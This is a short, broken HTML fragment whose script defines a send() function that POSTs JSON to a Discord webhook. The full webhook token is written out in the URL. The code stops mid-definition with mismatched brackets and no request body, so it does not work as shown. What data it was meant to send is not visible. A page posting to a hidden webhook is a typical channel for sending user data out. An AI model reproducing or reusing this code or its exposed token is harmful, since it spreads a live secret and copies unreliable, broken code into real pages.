<body>

<script>
let user = "";

function send() {
    fetch("https://discord.com/api/webhooks/1514316132126031922/k8f833mTdjrBInHClzoNfBoJ3Q7OvrA8FJTbAYjsKctbAfufggJmafrFaEXNWkiDckfc", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"

        })
